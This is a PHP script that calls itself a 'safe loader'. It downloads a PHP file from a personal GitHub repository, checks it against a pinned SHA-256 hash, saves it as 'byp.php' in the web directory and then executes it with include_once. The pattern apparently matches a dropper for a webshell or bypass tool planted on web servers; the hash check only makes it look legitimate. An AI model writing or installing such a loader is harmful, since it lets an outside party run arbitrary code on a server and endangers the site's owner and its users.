<?php
// Safe loader by file-hash pinning (no PHP 8 union types).
$remoteUrl      = 'https://raw.githubusercontent.com/rkrk1337/test/refs/heads/main/by.php';
$localFile      = __DIR__ . '/byp.php';
$expectedSha256 = '2c13217261ac3d660c22ba9c1e4be46588a321037d56a901e08bb5888fba423f'; // 64 hex chars, lowercase

function fetch($url, $timeout = 10) {
    $ch = curl_init($url);
    curl_setopt_array($ch, array(
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => $timeout,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_SSL_VERIFYHOST => 2,
    ));
    $body = curl_exec($ch);
    $err  = curl_errno($ch);
    curl_close($ch);
    if ($body === false || $err !== 0) {
        return false;
    }
    return $body;
}

$payload = fetch($remoteUrl);
if ($payload === false) {
    http_response_code(500);
    exit('download failed');
}

$sha = hash('sha256', $payload);
if (!hash_equals($expectedSha256, $sha)) {
    http_response_code(403);
    error_log("byp loader: sha mismatch. expected {$expectedSha256} got {$sha}");
    exit('integrity check failed');
}

$tmp = tempnam(sys_get_temp_dir(), 'byp_');
if ($tmp === false) { http_response_code(500); exit('tempfile failed'); }

if (file_put_contents($tmp, $payload) === false) {
    @unlink($tmp);
    http_response_code(500);
    exit('write failed');
}
@chmod($tmp, 0600);

if (!@rename($tmp, $localFile)) {
    @unlink($tmp);
    http_response_code(500);
    exit('atomic install failed');
}
@chmod($localFile, 0600);

include_once $localFile;

